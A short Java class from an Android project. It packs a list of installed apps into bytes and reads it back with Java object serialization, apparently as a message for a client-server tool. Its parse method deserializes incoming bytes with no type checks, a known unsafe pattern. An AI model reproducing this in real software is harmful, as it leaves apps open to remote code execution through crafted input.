package com.android.security.packages;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;

import com.android.security.utils.MyAPP;



public class APPListPacket implements Packet {
	private ArrayList<MyAPP> applist;

	public APPListPacket() {
		applist = new ArrayList();
	}

	public byte[] build() {
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(applist);
			return bos.toByteArray();
		} catch (IOException localIOException1) {
		}
		return null;
	}

	public boolean add(MyAPP myapp) {
		return applist.add(myapp);
	}

	public void parse(byte[] packet) {
		ByteArrayInputStream bis = new ByteArrayInputStream(packet);
		try {
			ObjectInputStream in = new ObjectInputStream(bis);
			applist = (ArrayList) in.readObject();
			return;
		} catch (Exception e) {
			String err = e.getMessage();
			err.toString();
		}
	}

	public ArrayList getList() {
		return applist;
	}
}
